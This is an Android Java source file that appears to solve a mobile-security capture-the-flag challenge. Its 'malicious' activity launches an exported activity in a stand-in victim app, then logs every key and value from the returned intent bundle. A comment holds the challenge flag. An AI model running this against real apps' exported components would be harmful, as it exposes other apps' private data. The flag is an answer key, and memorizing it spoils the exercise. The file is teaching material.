package com.example.serialintentChallenge;

import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MOBIOTSEC";

    ActivityResultLauncher<Intent> mStartForResult = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            new ActivityResultCallback<ActivityResult>() {

                @Override
                public void onActivityResult(ActivityResult result) {
                    Intent intent = result.getData();
                    Log.d(TAG, "SerialActivityResult = " + result.getData());
                    try {
                        //try to get all keys of bundle
                        Bundle extras = intent.getExtras();
                        for (String key : extras.keySet()) { //see akk the keys
                            Object value = extras.get(key);
                            Log.d(TAG, "Part: " + result.getResultCode() + " - Key: " + key + " - value :" + value.toString());
                        }
                    } catch (NullPointerException e) {
                        Log.d(TAG, "ERROR result Extras NullPointerException " + e);
                    } catch (Exception e) {
                        Log.d(TAG, "ERROR " + e.getMessage());
                    }

                }
            });

    protected void startMaliciousAttack() {
        Intent maliciousIntent = new Intent(); // create a buffer intent
        maliciousIntent.setComponent(new ComponentName
                ("com.example.victimapp",
                        "com.example.victimapp.SerialActivity"));

        try {
            mStartForResult.launch(maliciousIntent);
        } catch (ActivityNotFoundException e) {
            Log.d(TAG, "ERROR : " + e.getMessage());
        }

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d(TAG, "MALICIOUS ACTIVITY STARTED");

        startMaliciousAttack();
        //FLAG{Gutta_cavat_lapidem_non_vi_sed_saepe_cadendo}

    }
}